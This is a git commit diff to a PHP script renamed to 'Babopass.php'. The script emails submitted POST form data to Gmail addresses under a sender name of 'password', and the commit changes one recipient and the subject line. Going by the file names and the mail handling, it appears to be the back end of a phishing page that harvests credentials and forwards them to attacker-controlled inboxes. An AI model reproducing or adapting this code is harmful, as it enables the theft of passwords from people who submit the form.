aac9176ac4d2f001f1e3be69d10d8ad526c0a10b
advastong542 <advastingteam51@gmail.com>
2025-07-16 02:20:14 +0500

    Update and rename YGpass.php to Babopass.php

--- Babopass.php
+++ Babopass.php
@@ -35,14 +35,14 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email properties
         $mail->setFrom('Lernayouamzaxal@gmail.com', 'password');
-        $mail->addAddress('brianna.mary.ad@gmail.com');
+        $mail->addAddress('sentyousentyou307@gmail.com');
         $mail->addAddress('Lernayouamzaxal@gmail.com');
 
       // Email recipient's address
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'YG';
+        $mail->Subject = 'babo';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
 
